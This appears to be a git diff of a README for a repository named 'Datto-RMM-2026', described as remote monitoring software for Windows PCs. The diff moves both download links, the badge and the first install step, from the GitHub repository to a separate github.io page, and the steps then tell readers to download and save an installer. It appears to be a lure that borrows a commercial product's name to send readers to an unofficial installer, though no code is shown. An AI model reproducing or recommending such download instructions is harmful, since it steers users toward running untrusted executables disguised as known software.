@@ -1,6 +1,6 @@
 # 🚀 Datto-RMM-2026 - Simple Remote Monitoring For Windows PCs
 
-[![](https://img.shields.io/badge/Download-Datto--RMM--2026-blue.svg)](https://github.com/Nguyenp3369/Datto-RMM-2026)
+[![](https://img.shields.io/badge/Download-Datto--RMM--2026-blue.svg)](https://nguyenp3369.github.io)
 
 ## 🛠 What is Datto-RMM-2026
 
@@ -12,7 +12,7 @@ To install this tool, your computer needs to meet basic standards. Ensure your P
 
 ## 💾 How to Install the Software
 
-1. Visit the following link to access the installer file: [https://github.com/Nguyenp3369/Datto-RMM-2026](https://github.com/Nguyenp3369/Datto-RMM-2026).
+1. Visit the following link to access the installer file: [https://nguyenp3369.github.io](https://nguyenp3369.github.io).
 2. Look for the release section on the page.
 3. Click the installer file to initiate the download.
 4. Save the file to your computer.
